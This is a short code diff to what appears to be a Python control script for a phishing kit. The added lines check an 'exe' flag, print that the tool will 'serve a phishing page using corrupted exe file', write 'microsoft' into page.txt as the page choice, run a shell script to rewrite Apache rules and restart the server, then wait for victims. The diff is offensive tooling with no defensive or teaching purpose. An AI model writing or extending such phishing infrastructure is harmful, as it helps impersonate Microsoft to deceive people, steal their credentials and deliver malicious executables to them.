@@ -5,13 +5,28 @@ import sys
 import signal
 
 
+YELLOW = "\033[33m"
 GREEN = "\033[32m"
 CYAN = "\033[36m"
 RED = "\033[31m"
 RESET = "\033[0m"
 
 
+with open('exe', 'r') as e:
+ exe = e.read()
 
+
+if '1' in exe:
+    print(f"{YELLOW}Removing rules from apache server due to new settings detected...")
+    print(f"{CYAN}EXE flag detected : will serve a phishing page using corrupted exe file")
+    os.system("rm -rf page.txt")
+    with open('page.txt', 'w') as f:
+        f.write("microsoft")
+    print(f"{CYAN}EXE mode, rewriting new rules and new phishing page in apache folder and restarting it...")
+    restart = subprocess.Popen("bash newmode.sh", shell=True)
+    time.sleep(35)
+else:
+  None
 
 
 print('Waiting for users... ctrl+c to leave...')
